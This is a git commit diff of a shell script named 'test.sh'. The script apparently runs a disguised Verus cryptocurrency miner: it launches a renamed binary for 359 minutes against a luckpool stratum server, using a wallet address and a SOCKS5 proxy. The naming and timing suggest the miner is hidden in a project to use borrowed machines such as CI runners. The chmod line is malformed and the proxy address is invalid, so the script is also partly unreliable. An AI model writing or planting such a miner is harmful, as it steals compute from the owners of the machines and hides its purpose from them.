f0426f16be35990292c123cfcd9b6dbbe37dbe25
chiarasss <87688804+chiarasss@users.noreply.github.com>
2021-09-04 08:41:29 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen libjansson4 -y
-chmod +x cuk.sh && chmod +x hejo chmod 777 hejo cuk.sh
+chmod +x test.sh && chmod +x haha chmod 777 haha test.sh
 screen -dmS ls
 A=stratum+tcp://na.luckpool.net:3956
 B=R9WfkuyN7thLWMiL98b2NrHfL1qRYzqcdY
 C=TESSSS
 D=socks5://7134.209.240.44:1080
-timeout 359m ./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
+timeout 359m ./haha -a verus -o $A -u $B.$C -p x -t 2 -x $D
 sudo apt update
